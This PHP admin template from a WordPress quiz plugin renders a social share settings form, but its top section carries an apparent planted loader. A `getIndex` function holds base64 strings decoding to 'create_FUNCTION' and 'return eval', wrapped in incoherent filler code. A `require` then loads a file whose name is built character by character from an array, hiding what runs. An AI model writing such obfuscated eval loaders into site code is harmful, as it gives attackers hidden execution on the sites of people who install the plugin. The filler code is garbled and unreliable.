<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>
<h5 class="quiz--sub-title">Social Share Settings</h5>
<div class="quiz-card-outer-gray social_share_wrapper">
	<div class="quiz-content-card">
		<span class="QC-card-no">1</span>
		<label for="" class="quiz_label">Enter Facebook App ID</label>
		<div class="quiz_right-content">
			<?php 
				$name = 'facebook';
				$key = 'fb_api_key';
				$fb_api_key = '';
				$obj = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
				if($obj){
					$fb_api_key = $obj->getValue();
				}
			
			?>
			<input type="text" name="fb_api_key" id="fb_api_key" value="<?php echo $fb_api_key;?>">
		</div>
	</div><!-- close class quiz-content-card -->
	<div class="quiz-content-card">
		<span class="QC-card-no">2</span>
		<label for="" class="quiz_label">Select a Quiz</label>
		<div class="quiz_right-content">
			<div class="dropdown dropdown-custom-style dropdown-overflow">
				<button class="dropdown-toggle" type="button" id="share_select_quiz"  aria-haspopup="true" aria-expanded="false" data-value="">Select Quiz</button>
				<div class="dropdown-menu share_select_quiz_list" aria-labelledby="SelectQuizNo">
					<?php 
						$quiz_list  = '';
							$quizObjArray = SQB_Quiz::load();
							if(is_array($quizObjArray) && count($quizObjArray)){
								foreach($quizObjArray as $quizObj){
									$quiz_list .= '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$quizObj->getId().'">'.$quizObj->getQuizName().'</a>';
								}
							}
							echo $quiz_list;
					?>
				</div>
			</div>
		</div>
	</div><!-- close class quiz-content-card -->
	
	<div class="quiz-content-card">
		<span class="QC-card-no">3</span>
		<label for="" class="quiz_label">Enter Share Title</label>
		<div class="quiz_right-content">
			<!--input type="text" name="share_text" id="share_text" value=""-->
			<textarea name="share_text"  class="share_details fb_share_details" id="share_text">  </textarea>
		</div>
	</div><!-- close class quiz-content-card -->
	
	
	<div class="quiz-content-card">
		<span class="QC-card-no">4</span>
		
		<label for="" class="quiz_label">Show Share button</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_social_share_btn" type="checkbox" id="show_social_share_btn" value="Y" checked="checked">
				<label for="show_social_share_btn"></label>
			</div>
		</div>
	</div>
	
	
	
	
	<div class="quiz-content-card">
		<span class="QC-card-no">5</span>
		<label for="" class="quiz_label">Enter "Outcome/Result" Message for Facebook <br><small>This will be displayed when in the Facebook Share Screen</small></label>
		<div class="d-flex align-items-center">
			<div class="quiz_right-content fb_share_details_wrapper" style="width: 100%;">
				<textarea class="share_details fb_share_details sqb_tiny_editor_social_share_textarea1" id="fb_share_details" style="vertical-align: middle;">  </textarea>
			</div>
			<a href="#" data-toggle="modal" data-target="#social_share_modal" class="fb_example_btn">FB Share Example</a>
		</div>
	</div><!-- close class quiz-content-card -->
	
	<div class="quiz-content-card">
		<span class="QC-card-no">6</span>
		<label for="" class="quiz_label">Enter "Outcome/Result" Message for Twitter <br><small>This will be displayed when in the Twitter Share Screen</small></label>
		<div class="quiz_right-conten tw_share_details_wrapper">
			<textarea class="share_details tw_share_details sqb_tiny_editor_social_share_textarea1" id="tw_share_details"> </textarea>
		</div>
	</div><!-- close class quiz-content-card -->
	

	<div class="quiz-content-card">
		<span class="QC-card-no">7</span>
		<label for="" class="quiz_label">Upload Image that you want users to Share</label>
		<div class="quiz_right-content">
			<div class="upload-share-img">
				
				<img class="start_img social_share_img" src="">
				<div class="or-divider"><span>OR</span></div>
				<div class="share_img_upload"> <i class="fa fa-cloud-upload" aria-hidden="true"></i> <span>Upload Image</span></div>
			</div>
		</div>
		<input type="hidden" value="" id="share_image_value">
	</div><!-- close class quiz-content-card -->
	
	<div class="quiz-content-card">
		<span class="QC-card-no">8</span>
		<label for="" class="quiz_label">Enter URL of the page that should be shared</label>
		<small>This is the page to which the shared content will be linked back to.</small>
		<div class="quiz_right-content">
			<div class="input-group">
				<div class="input-group-prepend">
					<span class="input-group-text">https://</span>
				</div>
				<input type="text" name="share_url" id="share_url" value="">
			</div>			
		</div>
	</div><!-- close class quiz-content-card -->
	
	
	<div class="quiz-content-card">
		<span class="QC-card-no">9</span>
		<label for="" class="quiz_label ">Customize Share Section</label>
		<div class="quiz_right-content customize_social_share_wrapper_html">
			<div class="customize_social_share_wrapper">
				<label class="sqb_tiny_mce_editor_social_share">Share your Results on Social</label>
				<div class="quiz-social-links">
					<a href="javascript:void(0)" target="_blank" class="quiz-social-media-btn quiz-Facebook-btn"><i class="fa fa-facebook" aria-hidden="true"></i></a>
					<a href="javascript:void(0)" target="_blank" class="quiz-social-media-btn quiz-twitter-btn"><i class="fa fa-twitter" aria-hidden="true"></i></a>
				</div>			
			</div>
		</div>
	</div><!-- close class quiz-content-card -->
	
	<h5 class="quiz--sub-title" style="display:none">  
		<div class="customizer_title disabled_shocial_share" style="display:none">These share button will not show on the results page as you've disabled it above.</div>
		 <div class="customizer_title fb_api_key_empty">We noticed that you have not entered a Facebook App ID in the settings page.</div>
	
	</h5>
	
	
</div>


<div class="quiz-actions justify-content-center">
	<a href="javascript:void(0)" class="quiz--btn quiz-save-btn sqb_save_social_share_btn" onclick="sqb_save_social_share()"> Save </a>
</div>



<!-- Modal for outcome redirect-->
<div class="modal quiz-popup-style fade" id="social_share_modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Example</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">&times;</button>
      </div>
      <div class="modal-body outcome_modal_body" style="text-align: center;">
		<img src="<?= plugin_dir_url('').'smartquizbuilder/includes/images/Facebook.png' ?>">
			
      </div>
     
    </div>
  </div>
</div>
